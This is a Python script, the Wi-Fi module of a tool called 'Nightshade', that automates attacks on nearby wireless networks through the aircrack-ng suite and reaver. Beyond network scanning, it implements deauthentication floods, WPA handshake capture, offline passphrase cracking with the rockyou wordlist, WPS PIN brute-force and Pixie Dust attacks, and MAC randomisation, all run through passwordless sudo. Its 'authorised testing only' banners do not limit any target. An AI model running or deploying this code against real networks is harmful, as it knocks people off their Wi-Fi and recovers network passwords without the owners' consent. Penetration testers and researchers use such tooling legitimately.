#!/usr/bin/env python3
"""Wi-Fi section for Nightshade: one mode per invocation.

Scanning and link details go through NetworkManager / iw and need no
privileges. Monitor mode, packet capture, deauth and handshake capture need
CAP_NET_ADMIN / CAP_NET_RAW, so they run through the passwordless sudo
configured for the service account.

Attack modes are for authorised testing only. Turning monitor mode on tears
down the managed wlan0 interface, which drops Wi-Fi and therefore Tailscale and
SSH until monitor mode is stopped.
"""
import gzip
import json
import re
import shutil
import subprocess
import sys
from pathlib import Path

ANSI = re.compile(r'\x1b\[[0-9;]*m')
MAC = re.compile(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$')
STATE = Path.home() / '.local' / 'state' / 'nightshade'
CAPTURES = STATE / 'captures'
TARGETS = STATE / 'targets.json'
WORDLIST = STATE / 'rockyou.txt'
ROCKYOU = Path('/usr/share/wordlists/rockyou.txt.gz')
CONFIG = Path(__file__).resolve().parent.parent / 'config.json'


def run(argv, timeout=25, stdin=None):
    try:
        done = subprocess.run(argv, capture_output=True, text=True, timeout=timeout, stdin=stdin)
        return done.returncode, ANSI.sub('', (done.stdout or '') + (done.stderr or ''))
    except FileNotFoundError:
        return 127, 'Missing tool: ' + argv[0]
    except subprocess.TimeoutExpired:
        return 124, 'Timed out: ' + ' '.join(argv)


def monitor_interface():
    """Return the interface currently in monitor mode, if any."""
    rc, out = run(['iw', 'dev'], 8)
    interface = None
    for line in out.splitlines():
        line = line.strip()
        if line.startswith('Interface '):
            interface = line.split(' ', 1)[1]
        elif line.startswith('type monitor') and interface:
            return interface
    return None


def configured_adapter():
    """Interface pinned in config.json (wifi.adapter), if any."""
    try:
        value = (json.loads(CONFIG.read_text()).get('wifi') or {}).get('adapter')
        if value and str(value).strip().lower() != 'auto':
            return str(value).strip()
    except (OSError, ValueError):
        pass
    return None


def uplink_interface():
    """The interface carrying the default route (the built-in Wi-Fi)."""
    rc, out = run(['ip', '-j', 'route', 'show', 'default'], 8)
    if rc == 0:
        try:
            routes = json.loads(out) or []
            if routes and routes[0].get('dev'):
                return routes[0]['dev']
        except ValueError:
            pass
    return None


def wireless_interfaces():
    rc, out = run(['iw', 'dev'], 8)
    names = []
    for line in out.splitlines():
        line = line.strip()
        if line.startswith('Interface '):
            names.append(line.split(' ', 1)[1])
    return names


def wifi_adapter():
    """Interface to put into monitor mode.

    Prefers an external adapter (e.g. an Alfa AWUS036ACS) over the
    built-in Wi-Fi, so monitor mode never tears down the connection the
    panel itself depends on. Falls back to the uplink when no second
    wireless interface is present.
    """
    fixed = configured_adapter()
    if fixed:
        return fixed
    uplink = uplink_interface()
    external = [name for name in wireless_interfaces() if name != uplink]
    return external[0] if external else (uplink or 'wlan0')


def scan_networks():
    rc, out = run(['nmcli', '-e', 'no', '-t', '-f', 'BSSID,SSID,SIGNAL,SECURITY,CHAN',
                   'device', 'wifi', 'list', '--rescan', 'yes'], 30)
    nets = {}
    if rc != 0:
        return []
    for line in out.splitlines():
        parts = line.rsplit(':', 3)
        if len(parts) != 4:
            continue
        left, signal, security, channel = parts
        bssid = left[:17]
        if not MAC.match(bssid):
            continue
        try:
            strength = int(signal)
        except ValueError:
            strength = 0
        nets[bssid.upper()] = {'bssid': bssid.upper(), 'essid': (left[18:] or '(hidden)'),
                               'channel': channel or '?', 'signal': strength,
                               'security': security or 'open'}
    return sorted(nets.values(), key=lambda net: net['signal'], reverse=True)


def load_targets():
    try:
        return json.loads(TARGETS.read_text())
    except (OSError, ValueError):
        return {'selected': 0, 'networks': []}


def save_targets(data):
    STATE.mkdir(parents=True, exist_ok=True)
    TARGETS.write_text(json.dumps(data))


def selected_network():
    data = load_targets()
    nets = data.get('networks') or []
    return nets[data.get('selected', 0) % len(nets)] if nets else None


def targets():
    print('NIGHTSHADE / TARGETS\n')
    nets = scan_networks()
    if not nets:
        print('No networks found'); return
    save_targets({'selected': 0, 'networks': nets})
    for index, net in enumerate(nets[:12]):
        marker = '\u25b8' if index == 0 else ' '
        print(f'{marker}{index:<2} {net["signal"]:>3}% ch{net["channel"]:<3} {net["essid"]}')
    print(f'\n{nets[0]["bssid"]} selected')


def cycle_target(step):
    data = load_targets()
    nets = data.get('networks') or []
    if not nets:
        print('Run Targets first'); return
    data['selected'] = (data.get('selected', 0) + step) % len(nets)
    save_targets(data)
    net = nets[data['selected']]
    print(f'Target {data["selected"]}/{len(nets) - 1}\n')
    print(f'{net["essid"]}')
    print(f'{net["signal"]}% ch{net["channel"]} {net["security"]}')
    print(net['bssid'])


def ap_detail():
    print('NIGHTSHADE / ACCESS POINT\n')
    net = selected_network()
    if not net:
        print('Run Targets first'); return
    fresh = next((n for n in scan_networks() if n['bssid'] == net['bssid']), None)
    net = fresh or net
    for label, value in [('SSID', net['essid']), ('BSSID', net['bssid']), ('CHANNEL', net['channel']),
                         ('SIGNAL', f'{net["signal"]}%'), ('SECURITY', net['security'])]:
        print(f'{label:<9}{value}')


def scan():
    print('NIGHTSHADE / WI-FI SCAN\n')
    nets = scan_networks()
    if not nets:
        print('Scan failed'); return
    print(f'{len(nets)} networks found\n')
    for net in nets[:8]:
        print(f'{net["signal"]:>3}% ch{net["channel"]:<3} {net["security"]:<5} {net["essid"]}')


def info():
    print('NIGHTSHADE / WI-FI LINK\n')
    rc, out = run(['nmcli', '-e', 'no', '-t', '-f',
                   'GENERAL.DEVICE,GENERAL.STATE,GENERAL.CONNECTION', 'device', 'show', 'wlan0'], 8)
    for line in out.splitlines():
        print(line.replace(':', ' '))
    print()
    rc, out = run(['iw', 'dev', 'wlan0', 'link'], 8)
    print(out.strip() or 'wlan0 not linked')
    print('\nMonitor adapter: ' + wifi_adapter())


def monitor_on():
    print('NIGHTSHADE / MONITOR MODE\n')
    existing = monitor_interface()
    if existing:
        print(f'Already in monitor mode: {existing}'); return
    uplink = uplink_interface()
    adapter = wifi_adapter()
    if adapter == uplink:
        print('No external adapter found; using the built-in interface.')
        print('Wi-Fi and Tailscale will drop.\n')
    else:
        print(f'External adapter {adapter}; built-in Wi-Fi stays up.\n')
    rc, out = run(['sudo', '-n', 'airmon-ng', 'start', adapter], 45)
    for line in out.splitlines():
        if line.strip():
            print(line)
    print('\nMonitor interface: ' + (monitor_interface() or 'not detected'))


def monitor_off():
    print('NIGHTSHADE / MONITOR MODE OFF\n')
    interface = monitor_interface()
    if not interface:
        print('No monitor interface found'); return
    rc, out = run(['sudo', '-n', 'airmon-ng', 'stop', interface], 45)
    for line in out.splitlines():
        if line.strip():
            print(line)


def _set_channel(interface, channel):
    if str(channel).isdigit():
        run(['sudo', '-n', 'iw', 'dev', interface, 'set', 'channel', str(channel)], 10)


def deauth():
    print('NIGHTSHADE / DEAUTH\n')
    print('AUTHORISED TESTING ONLY\n')
    interface = monitor_interface()
    if not interface:
        print('Start Monitor mode first'); return
    net = selected_network()
    if not net:
        print('Run Targets first'); return
    _set_channel(interface, net['channel'])
    print(f'{net["essid"]} ({net["bssid"]})')
    rc, out = run(['sudo', '-n', 'aireplay-ng', '--deauth', '16', '-a', net['bssid'], interface], 30)
    for line in out.splitlines()[-6:]:
        if line.strip():
            print(line)


def capture():
    print('NIGHTSHADE / CAPTURE\n')
    interface = monitor_interface()
    if not interface:
        print('Start Monitor mode first'); return
    CAPTURES.mkdir(parents=True, exist_ok=True)
    for old in CAPTURES.glob('capture-*'):
        try:
            old.unlink()
        except OSError:
            pass
    prefix = CAPTURES / 'capture'
    print(f'Capturing 18s on {interface}...\n')
    run(['sudo', '-n', 'timeout', '18', 'airodump-ng', '--output-format', 'csv',
         '--write', str(prefix), interface], 30)
    sheets = sorted(CAPTURES.glob('capture-*.csv'))
    if not sheets:
        print('No capture written'); return
    aps, clients = [], []
    section = 'ap'
    for row in sheets[0].read_text(errors='replace').splitlines():
        if not row.strip():
            section = 'client'; continue
        cells = [cell.strip() for cell in row.split(',')]
        if cells[0].startswith('BSSID'):
            continue
        if section == 'ap':
            try:
                aps.append((int(cells[8]), cells[3], cells[13]))
            except (IndexError, ValueError):
                continue
        elif cells[1].startswith('Station MAC') or not cells[0]:
            continue
        elif len(cells) > 1 and MAC.match(cells[0]):
            clients.append(cells[0])
    aps.sort(reverse=True)
    print(f'Access points: {len(aps)}   Clients: {len(clients)}\n')
    for power, channel, essid in aps[:6]:
        print(f'{power:>4}dBm ch{channel:<3} {essid or "(hidden)"}')


def handshake():
    print('NIGHTSHADE / HANDSHAKE CAPTURE\n')
    interface = monitor_interface()
    if not interface:
        print('Start Monitor mode first'); return
    net = selected_network()
    if not net:
        print('Run Targets first'); return
    CAPTURES.mkdir(parents=True, exist_ok=True)
    for old in CAPTURES.glob('handshake-*'):
        try:
            old.unlink()
        except OSError:
            pass
    prefix = CAPTURES / 'handshake'
    print(f'Watching {net["essid"]} for 35s...\n')
    run(['sudo', '-n', 'timeout', '35', 'airodump-ng', '-c', net['channel'], '--bssid', net['bssid'],
         '-w', str(prefix), '--output-format', 'pcap', interface], 45)
    caps = sorted(CAPTURES.glob('handshake-*.cap')) + sorted(CAPTURES.glob('handshake-*.pcap'))
    if not caps:
        print('No capture written'); return
    rc, out = run(['aircrack-ng', str(caps[0])], 20, stdin=subprocess.DEVNULL)
    if any('handshake' in line.lower() for line in out.splitlines()):
        print(f'Handshake captured -> {caps[0].name}')
    else:
        print(f'No handshake yet in {caps[0].name}')


def crack():
    print('NIGHTSHADE / CRACK HANDSHAKE\n')
    caps = sorted(CAPTURES.glob('handshake-*')) + sorted(CAPTURES.glob('capture-*.cap'))
    caps = [c for c in caps if c.is_file() and c.suffix in ('.cap', '.pcap')]
    if not caps:
        print('Run Handshake capture first'); return
    target = max(caps, key=lambda p: p.stat().st_mtime)
    if not WORDLIST.exists():
        if not ROCKYOU.exists():
            print('No wordlist available'); return
        print('Unpacking rockyou (one time)...')
        try:
            with gzip.open(ROCKYOU, 'rb') as src, open(WORDLIST, 'wb') as dst:
                shutil.copyfileobj(src, dst, 1024 * 1024)
        except OSError as exc:
            print('Unpack failed:', exc); return
    print(f'Cracking {target.name}...\n')
    rc, out = run(['aircrack-ng', '-w', str(WORDLIST), '-l', str(STATE / 'cracked.txt'), str(target)], 600)
    for line in out.splitlines():
        if any(token in line for token in ('KEY FOUND', 'Passphrase', 'keys tested', 'No networks')):
            print(line.strip())
    print('\nDone — keys (if any) in cracked.txt')


def wps_scan():
    print('NIGHTSHADE / WPS SCAN\n')
    interface = monitor_interface()
    if not interface:
        print('Start Monitor mode first'); return
    print(f'Scanning for WPS on {interface}...\n')
    rc, out = run(['sudo', '-n', 'timeout', '25', 'wash', '-i', interface, '-s'], 35)
    lines = [line for line in out.splitlines() if line.strip()]
    if not lines:
        print('No WPS access points found'); return
    for line in lines[:12]:
        print(line)


def wps_attack():
    print('NIGHTSHADE / WPS ATTACK\n')
    print('AUTHORISED TESTING ONLY\n')
    interface = monitor_interface()
    if not interface:
        print('Start Monitor mode first'); return
    net = selected_network()
    if not net:
        print('Run Targets first'); return
    channel = str(net['channel'])
    if not channel.isdigit():
        print('Target channel unknown; rescan with Targets'); return
    _set_channel(interface, channel)
    print(f'{net["essid"]} ({net["bssid"]}) ch{channel}')
    print('Runs four minutes, then stops; re-run to resume.\n')
    rc, out = run(['sudo', '-n', 'timeout', '240', 'reaver', '-i', interface,
                   '-b', net['bssid'], '-c', channel, '-S', '-vv', '-L', '-N'], 300)
    for line in out.splitlines()[-10:]:
        if line.strip():
            print(line)


def wps_pixie():
    print('NIGHTSHADE / PIXIE DUST\n')
    print('AUTHORISED TESTING ONLY\n')
    interface = monitor_interface()
    if not interface:
        print('Start Monitor mode first'); return
    net = selected_network()
    if not net:
        print('Run Targets first'); return
    channel = str(net['channel'])
    if not channel.isdigit():
        print('Target channel unknown; rescan with Targets'); return
    _set_channel(interface, channel)
    print(f'{net["essid"]} ({net["bssid"]}) ch{channel}')
    print('Offline bypass attempt, up to four minutes.\n')
    rc, out = run(['sudo', '-n', 'timeout', '240', 'reaver', '-i', interface,
                   '-b', net['bssid'], '-c', channel, '-K', '1', '-S', '-vv'],
                  300)
    for line in out.splitlines()[-12:]:
        if line.strip():
            print(line)


def mac_random():
    print('NIGHTSHADE / MAC RANDOMIZER\n')
    adapter = wifi_adapter()
    if adapter == (uplink_interface() or 'wlan0'):
        print('No external adapter found; leaving the uplink alone.'); return
    # macchanger flips the interface down with an ioctl, which the service
    # sandbox refuses; do the down/up with ip (netlink) around it instead.
    run(['sudo', '-n', 'ip', 'link', 'set', adapter, 'down'], 15)
    rc, out = run(['sudo', '-n', 'macchanger', '-r', adapter], 30)
    run(['sudo', '-n', 'ip', 'link', 'set', adapter, 'up'], 15)
    for line in out.splitlines():
        if line.strip():
            print(line)


def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else ''
    if mode == 'scan':
        scan()
    elif mode == 'info':
        info()
    elif mode == 'targets':
        targets()
    elif mode == 'target-next':
        cycle_target(1)
    elif mode == 'target-prev':
        cycle_target(-1)
    elif mode == 'ap':
        ap_detail()
    elif mode == 'monitor-on':
        monitor_on()
    elif mode == 'monitor-off':
        monitor_off()
    elif mode == 'deauth':
        deauth()
    elif mode == 'capture':
        capture()
    elif mode == 'handshake':
        handshake()
    elif mode == 'crack':
        crack()
    elif mode == 'wps-scan':
        wps_scan()
    elif mode == 'wps-attack':
        wps_attack()
    elif mode == 'pixie-dust':
        wps_pixie()
    elif mode == 'mac-random':
        mac_random()
    else:
        sys.exit('Unknown wifi tool')


if __name__ == '__main__':
    main()
